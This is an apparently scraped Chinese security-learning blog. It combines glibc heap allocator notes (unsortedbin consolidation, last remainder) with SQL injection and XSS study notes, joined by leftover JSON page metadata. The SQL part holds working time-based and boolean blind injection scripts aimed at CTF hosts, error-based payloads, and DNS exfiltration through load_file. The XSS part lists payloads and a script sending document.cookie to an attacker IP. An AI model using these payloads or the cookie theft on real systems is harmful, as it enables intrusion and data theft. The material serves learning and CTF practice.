我们知道大于0x80的chunk被释放之后就放到了unsortedbin上面去，但是unsortedbin是一个未分类的bin，上面的chunk也处于未分类的状态。但是这些chunk需要在特定的条件下被整理然后放入到smallbins或者largebins中 这个整理的过程被称为unsortedbin的“consolidate”，但是“consolidate”是要在特定的条件下才会发生的，并且与malloc紧密相关 2.触发场景 当我们malloc一个chunk，这个chunk的大小大于smallbin的范围，在unsortedbin中寻找可用的freechunk使用时，会触发malloc_conlolidate malloc时如果bin链中没有可以使用的freechunk，并且去切割topchunk，发现topchunk也不够用，此时回去再去调用malloc_consolidate进行一次整理 发现unsortedbin中有大的freechunk可以切割给malloc使用时，切割unsortedbin，产生last remainder的时候会consolidate 着重强调，1和2都会去寻找fastbin中的free chunk 3.具体分析当我们malloc一个大小大于smallbin的chunk时： 第一步：将fastbins中的chunk都整理到unsortedbin中，整理的过程中如果有物理相邻且空闲的fastchunk就合并，如果fastchunk与topchunk相邻，那么fastchunk就与topchunk合并（这个过程发生在_int_malloc函数调用的malloc_consolidate函数中） 第二步：malloc去检查unsortedbin中是否有与自己malloc大小相对应的chunk可以使用，如果有与自己malloc大小相对应的chunk可以使用就直接使用；如果没有那么就去判断unsortedbin中是否有可以用来切割的大chunk可以使用，如果可以切割，就切割大的chunk使用，然后产生last remainder（这个过程发生在_int_malloc函数的for循环中） 第三步：如果没有可以切割的大chunk可以使用，此时就将unsortedbin上的chunk放入到对应的bins链上 第四步：malloc从第一次分配的大堆块上面找空间来使用 4.演示一1234567891011121314#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; void *p=malloc(0x30); sleep(0); //只为了程序打断点使用，无其他作用 free(p); void *p2=malloc(0x500); free(p2); return 0;&#125; 打断点 看堆信息 释放p1 看到进入fastbin中 分配p2 可以看到我们p1好像是被覆盖了 我们具体来说一下这个过程 当分配比small bin大的chunk时，我们就会触发consolidate， 我们知道fastchunk是不会合并的 所以它们这时就会进入unsortedbin中 然后malloc去切割unsortedbin中的这个freechunk，发现不能够切割，于是就放入smallbin中，放入smallbin中之后便成为smallchunk了，就可以与topchunk合并了 合并之后malloc从topchunk中申请一个堆块 5.演示二1234567891011121314#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; void *p=malloc(0x30); void *p1=malloc(0x30); sleep(0); //只为了程序打断点使用，无其他作用 free(p); free(p1); void *p2=malloc(0x500); free(p2); return 0;&#125; 释放p1和p 下面我们猜想会发送什么? 由于分配chunk较大 所以我们会触发consolidate 这时两个fastchunk就会进入unsortedbin中 根据上面规则 它下一步就会进入small bins 又因为和top chunk相邻 所以top chunk会合并 直观感觉就是我们覆盖了之前的chunk 0x14 last remainder1.定义 如果在bins链中存在freechunk时，当我们去malloc的时候，malloc的请求大小比freechunk的大小小，那么arena就会切割这个freechunk给malloc使用，那么切割之后剩余的chunk就被称为“last remainder” 当产生last remainder之后，表示arena的malloc_state结构体中的last_remainder成员指针就会被初始化，并且指向这个last remainder 2.产生场景 malloc的时候，不论malloc的大小，首先会去检查每个bins链（出去fastbins链）是否有与malloc相等大小的freechunk，如果没有就去检查bins链中是否有大的freechunk可以切割，如果切割，那么就切割大的freechunk，那么切割之后的chunk成为last remainder，并且last remainder会被放入到unsortedbin中 切割unsortedbin中的大chunk时： 当unsortedbin有对应的freechunk可以给malloc切割使用时，unsortedbin会发生以下步骤： ①先将这些freechunk放置到对应大小的bins链上（放入smallbin或largebin） ②放置到对应的bins链上之后，切割此freechunk ③切割之后会产生last remainder，再将last remainder放到unsortedbin上 例如： 此时，unsortedbin有两个0x800的freechunk 此时申请一个0x600的chunk 那么unsortedbin会先consolidate，把两个0x800的freechunk先移动到largebin中 然后再切割largebin的freechunk，将切割后余留下的0x200放入unsortedbin 切割smallbins、largebins中的大chunk时： ①切割smallbins或者largebins中的大freechunk，产生last remainder ②将last remainder放入到unsortedbin中 3.last remainder的consolidate当我们切割一个bins链中的大chunk时产生last reminader时，会发生consolidate，但是此种consolidate不会去整理fastbins中的freechunk（重点） 4.演示一12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include&lt;malloc.h&gt;#include&lt;unistd.h&gt;#include&lt;string.h&gt;int main()&#123; int size = 0x120; void *p = malloc(size); void *junk = malloc(size); //放置释放p和q之后，p和q发生合并 void *q = malloc(size); void *r = malloc(size); //放置释放q之后，q和topchunk发生合并 printf(\"p:0x%x\\n\",p); printf(\"q:0x%x\\n\",q); printf(\"r:0x%x\\n\",r); strcpy(p,\"aaaaaaaabbbbbbbb\"); strcpy(q,\"ccccccccdddddddd\"); strcpy(r,\"eeeeeeeeffffffff\"); sleep(0); //只为了打断点使用，无其他作用 free(p); sleep(0); free(q); sleep(0); malloc(0x90); sleep(0); return 0;&#125; 断点 释放p和q 分配0x90 首先两个unsortedbin chunk中可以分割到0x90那么就会consolidate 将其全部放入smallbins中 之后分割其中一部分 并将剩余的放入lastremainder 5.演示二123456789101112131415161718192021222324252627#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x30; int size2=0x200; int *p1=malloc(size); int *p2=malloc(size2); int *temp=malloc(size); //防止p2和p3都被释放之后，p2和p3发生合并 int *p3=malloc(size2); int *temp2=malloc(size); //防止p3被释放之后与topchunk合并 sleep(0); //只为打断点使用 free(p1); sleep(0); free(p2); free(p3); sleep(0); malloc(0x100); sleep(0); return 0;&#125; 直接看释放p1 p2 p3 这里继续想一下下一步会发生什么？ 分配大小0x100可以分配 那么就直接触发consolidate说明smallbin中就会有free chunk lastremainder会放入unsortedbin中，此外fastfreechunk不会合并 那么我们就得到了 6.演示三123456789101112131415161718192021#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x300; int *p1=malloc(size); int *p2=malloc(size); //防止p1被释放之后与topchunk合并 sleep(0); //为了程序打断点使用，无其他作用 free(p1); sleep(0); malloc(0x700); sleep(0); malloc(0x200); return 0;&#125; 直接看p1释放后 之后会分配0x700说明要分配较大的chunk 此时会被整理到smallbins中 继续分配0x200 lastremainder会进入unsortedbin中 7.演示四12345678910111213141516171819202122232425262728293031#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x300; int *temp=malloc(0x30); int *p1=malloc(size); //防止p1释放并consolidate到smallbins中之后，再释放p2导致p1和p2合并，合并之后又被放入unsortedbin中 int *temp2=malloc(0x30); int *p2=malloc(0x100); int *p3=malloc(size);//防止p2被释放之后与topchunk合并 sleep(0); //为了程序打断点使用，无其他作用 free(p1); sleep(0); malloc(0x700); sleep(0); free(temp); free(p2); sleep(0); malloc(0x200); return 0;&#125; 先看堆信息 释放p1 分配0x700 由于unsorted bin中的chunk不够 所以直接从top chunk中分割 free tmp和p2 重点来看最后一步 这里，malloc(0x200)，此时malloc会切割smallbins中的p1，并产生last remainder（0x602250），并把last remainder放入到unsortedbin中。由于切割chunk并产生last remainder会发生consolidate，所以unsortedbin中的p2从unsortedbin中整理到smallbins中（由于此种情况的consolidate不会整理fastbins中的chunk，所以fastbins中的chunk仍然在fastbins中）","categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"},{"name":"堆","slug":"堆","permalink":"https://pz1o.top/tags/%E5%A0%86/"}]},{"title":"SQL注入","slug":"SQL注入","date":"2020-12-09T15:38:24.000Z","updated":"2020-12-09T15:39:32.233Z","comments":true,"path":"2020/12/09/SQL注入/","link":"","permalink":"https://pz1o.top/2020/12/09/SQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"我就单纯想把这些东西存下来 基础学习1.SQL注入的分类 基于从服务器接收到的响应 基于错误的SQL注入 联合查询的类型 堆查询注射 SQL盲注 基于布尔SQL盲注 基于时间的SQL盲注 基于报错的SQL盲注 基于如何处理输入的SQL查询 基于字符串 数字或整数 基于程度和顺序的注入 一阶注射 二阶注射 基于注入点的位置上的 通过用户输入的表单域的注射 通过cookie注射 通过服务器变量 2.基础函数与逻辑1.基础函数​ concat(str1,str2) ——无分隔连接字符串 ​ concat_ws(separator,str1,str2) ——含有分隔符连接字符串 ​ group_concat(str1,str2) ——以逗号分隔每一条数据，连接一个组的字符串 2.基础逻辑12$id=$_GET['id'];$sql=\"select * from users where id='$id' limit 0,1\"; 此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用—+ 或者 #（%23）。 limit 从0开始，至少1个数据 limit 10 至少10个数据 3.union操作符的用法union操作符用于合并两个或多个select语句的结果集。但注意的是，select的语句必须有相同数量的列，列也有相同的类型。 1select column_names from table_name1 union select column_names from table_name2; 4.一般操作123use information_schema; //进入系统数据库show tables; select table_name from information_schema.tables where table_schema = 'myclass'; //搜索当数据库名为myclass中各表的名字 1234select schema_name from information_schema.schemata; //猜数据库select table_name from information_schema.tables where table_schema='数据库名'; //猜某库的数据表select column_name form information_schema.columns where table_name='表名'; //猜某表的数据段select * from *; //猜数据段的内容 3.盲注的讲解（先看1-4之后再来看）1.基于布尔的SQL盲注2.基于时间的SQL盲注时间盲注和布尔盲注非常类似，但时间盲注是利用sleep()​和benchmark()等函数让mysql执行的时间变长。 时间盲注多与IF(expr1,expr2,expr3)结合使用，如果expr1是true，则执行expr2，否则执行expr3 INSERT INTO注入(case延时盲注)看了源码知道取xff头,并且explode过滤逗号。题目的源码如下： 123456789101112131415161718192021222324252627error_reporting(0);function getIp()&#123;$ip &#x3D; &#39;&#39;;if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]; &#x2F;&#x2F;获取请求的ip地址&#125;else&#123;$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];&#125;$ip_arr &#x3D; explode(&#39;,&#39;, $ip); &#x2F;&#x2F;将逗号过滤return $ip_arr[0]; &#125;$host&#x3D;&quot;localhost&quot;;$user&#x3D;&quot;&quot;;$pass&#x3D;&quot;&quot;;$db&#x3D;&quot;&quot;;$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);mysql_select_db($db) or die(&quot;Unable to select database&quot;);$ip &#x3D; getIp();echo &#39;your ip is :&#39;.$ip;$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;mysql_query($sql); 这道题是盲注题目说得也很明白，问题是怎么注入呢？这里有两个问题 第一个是理解insert...into注入 1234insert into client_ip(ip) values (&#39;$ip&#39;);&#x2F;&#x2F;这里主要结合sleep()进行注入insert into student(id,name) values (1,&#39;&#39;+(select sleep(3)))&#x2F;&#x2F;这样就插入了一条id&#x3D;1,name&#x3D;null的数据 第二个是过滤逗号的，所以不能用if(a,b,c)应该用case...when...then同时常用的截取字符串函数substr([str],[start],[len])也有替代的substr([str]from [strat] for [len]) 123456789case...when...then简单case函数case sex when &#39;1&#39; then &#39;nan&#39; when &#39;2&#39; then &#39;nv&#39; else &#39;qita&#39; endcase搜索函数case when sex &#x3D; &#39;1&#39; then &#39;nan&#39; when sex &#x3D; &#39;2&#39; then &#39;nv else &#39;qita&#39; end 接下来只需要构造就可以了、 12payload &#x3D; &quot;1&#39; (case substr(database()from 1 for 1) &#x3D; [string] then sleep(3) else 1 end))#&quot;&#x2F;&#x2F;最后一个)用来闭合 #用来注释 接下来就可以写脚本了 123456789101112131415161718192021222324252627282930import requestsallString = '''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''s = requests.session()url = \"http://123.206.87.240:8002/web15/\"data = \"\"flag = \"\"for i in range(1,50): for j in allString: payload = \"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\".format(i,j) headers = &#123;'x-forwarded-for':payload&#125; try: r = requests.get(url = url,headers = headers,timeout = 3) except requests.exceptions.ReadTimeout: flag += j print(flag) breakprint(\"flag is :&#123;\" +flag+\"&#125;\")//数据库payload = \"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\".format(i,j)库为web15//表payload = \"1'+(case when (substr((select group_concat(table_name)from information_schema.tables where table_schema='web15') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\".format(i,j)表为client_ip,flag//列payload = \"1'+(case when (substr((select group_concat(column_name)from information_schema.columns where table_name='flag') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\".format(i,j)flag//flagpayload = \"1'+(case when (substr((select * from flag) from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\".format(i,j) 就可以得到flag了。 flag{cdbf14c9551d5be5612f7bb5d2867853} 多次（mid布尔盲注）主要学习一下异或注入判断过滤了哪些关键词 123456789异或：1^1&#x3D;0，1^0&#x3D;1，0^1&#x3D;1，0^0&#x3D;0这样当构造：?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+若返回正确页面的回显(There is nothing.)，则说明(length(&#39;and&#39;)&#x3D;0)为假;若返回错误页面的回显(Error,Error,Error!)，则说明(length(&#39;and&#39;)&#x3D;0)为真。这里?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+均回显了Error,Error,Error!，说明(length(&#39;and&#39;)&#x3D;0)为真，那么可判断and被过滤了同理可判断or、select、union也被过滤了selselectectuniunionon 注意的是：information中也有or 继续学习盲注 123456789101112131415import requestsdic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;s &#x3D; requests.session()url &#x3D; &#39;&#39;data &#x3D; &#39;&#39;for i in range(0,50): for j in dic: #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j) #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag2&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)p payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select binary group_concat(flag2) from flag2),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j) r &#x3D; s.get(url&#x3D;payload) if &#39;Nobody&#39; not in r.text: data +&#x3D; j break print(data) 同时了解一下报错注入 好像注入的时候是不需要select的，但在mysql中是需要的 1?id&#x3D;1%27%20and%20updatexml(1,concat(%27~%27,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database())),1)%20--+ ctfhub（if布尔盲注）根据题目可知用 1if(a,b,c) a对就执行b，否则就执行c 这个题目正好是id=1,2会对，3就错所以我们把b=1或2，c为3 接下来写脚本就可以 12345678910111213141516171819import requestsdic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;url &#x3D; &#39;&#39;flag &#x3D; &#39;&#39;s &#x3D; requests.session()for i in range(0,50): for j in dic: payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((mid((select database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),1,3)&quot;.format(i,j) r &#x3D; s.get(url&#x3D;payload) if &#39;query_success&#39; in r.text: flag +&#x3D;j break print(flag)#表payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i,j)#列payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)#flagpayload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(flag)from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j) 不过中间好像是服务器会关闭所以我们可以分组扫描 比如从1-30，30-50 ctfhub（if时间盲注）和上一题一样直接写脚本 1234567891011121314151617181920import requestsdic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;url &#x3D; &#39;&#39;flag &#x3D; &#39;&#39;s &#x3D; requests.session()for i in range(0,50): for j in dic: try: payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j) r &#x3D; s.get(url&#x3D;payload,timeout&#x3D;1) except requests.exceptions.ReadTimeout: flag +&#x3D;j break print(flag)#表payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)#列payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)#flagpayload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(flag) from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j) 3.基于报错的SQL盲注12345' and updataxml(1,concat(0x7e,(select user()),0x7e),1) --+ //查看用户' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ //查看数据库' and updataxml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)--+ //查看数据库的名字' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='test ' limit 0,1),0x7e),1) --+ //查看各表的名字'and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='my student' limit 0,1),0x7e),1) --+ //查看列的名字 4.二次注入0x01二次注入原理防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。 第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。 第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。 5.DNS注入0x01DNS 0x02注入函数 12select load_file(&quot;D:&#x2F;1.txt&quot;); &#x2F;&#x2F;读取文件select load_file(&quot;\\\\\\\\xxx.php90.cn\\\\ccc&quot;) &#x2F;&#x2F;转义 0x03注入123select load_file(concat(&quot;\\\\\\\\&quot;,(select database()),&quot;xxx.php90.cn\\\\cc&quot;));select load_file(concat(&quot;\\\\\\\\&quot;,(select username from admin),&quot;xxx.php90.cn\\\\cc&quot;));select load_file(concat(&quot;\\\\\\\\&quot;,select HEX(username) from admin limit 0,1),&quot;xxx.php90.cn\\\\cc&quot;)); 6.报错注入更详细的解释https://xz.aliyun.com/t/253 报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。 报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这里主要记录一下xpath语法错误和concat+rand()+group_by()导致主键重复 xpath语法错误利用xpath语法错误来进行报错注入主要利用extractvalue和updatexml两个函数。使用条件：mysql版本&gt;5.1.5 extractvalue函数 函数原型：extractvalue(xml_document,Xpath_string)正常语法：extractvalue(xml_document,Xpath_string);第一个参数：xml_document是string格式，为xml文档对象的名称第二个参数：Xpath_string是xpath格式的字符串作用：从目标xml中返回包含所查询值的字符串 第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。 pyload：id=&#39;and(select extractvalue(&quot;anything&quot;,concat(&#39;~&#39;,(select语句)))) 例如： 123id&#x3D;&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,@@version)))12 针对mysql数据库： 12345查数据库名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select database()))))爆表名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))爆字段名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;))))爆数据：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))1234 注： ① 0x7e=’~’ ② concat(‘a’,‘b’)=“ab” ③ version()=@@version ④ ‘~‘可以换成’#’、’$’等不满足xpath格式的字符 ⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位 updatexml 函数原型：updatexml(xml_document,xpath_string,new_value)正常语法：updatexml(xml_document,xpath_string,new_value)第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值 第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同payload：id=&#39;and(select updatexml(&quot;anything&quot;,concat(&#39;~&#39;,(select语句())),&quot;anything&quot;)) 例如： 123&#39;and(select updatexml(1,concat(&#39;~&#39;,(select database())),1))&#39;and(select updatexml(1,concat(0x7e,@@database),1))12 同样，针对mysql： 1234爆数据库名：&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))爆表名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database())),0x7e))爆列名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;)),0x7e))爆数据：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e)) concat+rand()+group_by()导致主键重复这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。 rand()： 生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字 floor()： 对任意正或者负的十进制值向下取整 通常利用这两个函数的方法是floor(rand(0))*2 ,其会生成0和1两个数 group by group by是根据一个或多个列对结果集进行分组的sql语句，其用法为：SELECT column_name, aggregate_function(column_name)FROM table_nameWHERE column_name operator valueGROUP BY column_name 报错的原因是因为rand()函数在查询的时候会执行一次,插入的时候还会执行一次.这就是整个语句报错的关键 前面说过floor(rand(0)2) 前六位是*0110110 group by x先建立一个空表,用于分组.然后进行分组查询,第一次rand()执行,查询的结果是0,因为是空表所以插入这条,而插入的时候rand()又执行了一次,所以表中的结果就是 第一次执行完,接着执行rand()的值为1,因为表中存在,所以加1,表中结果成为 到了第三次执行rand()是值为0,因为表中不存在所以要插入新的数据,这次插入rand()再次执行,所以插入的又是1.而表中已经存在1了 此时插入因为重复出现同一个key,就会出现报错 重复出现key.而报错中会说明那个key有问题,我们的key中结合了想要了解的字符串root@localhost 这样就实现了报错注入,拿到了自己想要的数据 这就是整个报错注入的原理了,rand(),floor() group by 函数缺一不可. 12#payload1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x; 看一下ctfhub报错注入 ctfhub报错注入查表 查flag","categories":[{"name":"web","slug":"web","permalink":"https://pz1o.top/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://pz1o.top/tags/web/"}]},{"title":"xss","slug":"xss","date":"2020-12-09T15:34:13.000Z","updated":"2020-12-09T15:36:11.388Z","comments":true,"path":"2020/12/09/xss/","link":"","permalink":"https://pz1o.top/2020/12/09/xss/","excerpt":"","text":"这篇更乱，也就那个小挑战还算完整 XSS基础知识理解同步和异步：举个例子，比如有一个网页，html和php，php会延时执行。 同步：只有当php执行完之后，才会显示html网页。 异步：刷新之后，会立即显示html网页，之后再显示php执行的内容。 js设置cookie1document.cookie&#x3D;&quot;phpsessid&#x3D; &quot;; 0x01存储xss存储型xss主要是攻击者将xss代码插入到页面上，然后存在数据库里，当访问者访问这个页面时，就会导致xss代码执行。 出现场景：编辑内容（xss代码）可以保存，并且可以再次访问这个内容。 1&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt; 0x02反射xss攻击者在url中插入xss代码，服务器将url中的xss代码输入到页面上，攻击者将xss代码的url发送给用户，用户打开后受到xss攻击。 出现场景：url中可以传递参数 通常来说，会闭合一些标签，从而执行代码。 常用闭合 123&quot;&gt;&#39;&gt;&lt;&#x2F;xxx&gt; 其实还是具体情况具体对待 0x03dom型xss攻击者在url中插入xss代码，前端页面直接从url中获取xss代码并且输入到页面，导致xss代码的执行，攻击者将带有xss代码的url发送给用户，用户打开后受到xss攻击 关于反射型和dom型差别： 前端处理是dom，后端处理是反射 常用修复函数strip_tags：过滤html标签 htmlspecialchars：将html标签转换为实体 常用的payload标签123&lt;img src=\"x\" onerror=alert(1)&gt;&lt;img src=\"1\" onerror=eval(\"alert('xss')\")&gt;&lt;img src=1 onmouseover=alert('xss')&gt; 12345678910111213&lt;a href=\"javascript:alert('xss')\"&gt;aa&lt;/a&gt;&lt;a href=javascript:eval(alert('xss'))&gt;aa&lt;/a&gt;&lt;a href=\"javascript:aaa\" onmouseover=\"alert(/xss/)\"&gt;aa&lt;/a&gt;需要用编码绕过时：Base64：&lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==&gt;Murlencode：&lt;a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E&gt;M HTML实体编码 ：&lt;a href=j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)&gt;M&lt;a href=\"\" onclick=alert('xss')&gt;aa&lt;/a&gt;&lt;a href=\"\" onclick=eval(alert('xss'))&gt;bb&lt;/a&gt;&lt;a href=\"\" onmouseover=prompt('xss')&gt;cc&lt;/a&gt; 1234&lt;iframe src=\"data:text/html,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;\"&gt;&lt;/iframe&gt;&lt;iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=\"&gt;&lt;iframe src=\"aaa\" onmouseover=alert('xss') /&gt;&lt;iframe&gt;&lt;iframe src=\"javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;\"&gt;&lt;/iframe&gt; 1234&lt;input value=\"\" onclick=alert('xss') type=\"text\"&gt;&lt;input name=\"name\" onmouseover=alert('xss')&gt;&lt;input name=\"name\" value=\"\" onmouseover=prompt('xss') bad=\"\"&gt;&lt;input value=1 type=image src onerror=alert(1) &gt; 123Cookie盗取：&lt;script&gt;var img=document.createElement(\"img\");img.src=\"http://xxx.xxx.xxx.xxx:1234/a?\"+escape(document.cookie);&lt;/script&gt;nc监听端口1234 xss编码js编码JS提供了四种字符编码的策略， 三个八进制数字，如果数字不够，在前面补零，如a的编码为\\141 两个十六进制数字，如果数字不够，在前面补零，如a的编码为\\x61 四个十六进制数字，如果数字不够，在前面补零，如a的编码为\\u0061 对于一些控制字符，使用特殊的C类型的转义风格，如\\n和\\r HTML实体编码命名实体以&amp;开头，以分号结尾的，如&lt;的编码为&amp;1t; 字符编码 十进制，十六进制的ASCII码或者Unicode字符编码。样式为&amp;#数值; 如&lt;的编码为 &lt;(10进制)&amp;#60 &lt;(16进制)&amp;#x003c URL编码 这里为url全编码，也就是两次url编码 如alert的url全编码为%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34 String.fromCharCode编码 如alert的编码为String.fromCharCode(97,108,101,114,116) xss挑战题做任何题都可以测试 1&lt;&quot;script on alert()&quot; href&gt; 做一下xss题 level1 可以发现test在h2标签处，直接写就可以只需要弹窗，就可以进入下一关 1?name&#x3D;test&lt;script&gt;alert(1)&lt;&#x2F;script&gt; level2 对比可以发现，值直接在value处，所以只需要闭合标签即可 搜索框里直接写 1&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt; 同时还有其他方法 12345需要鼠标划过输入框&quot; 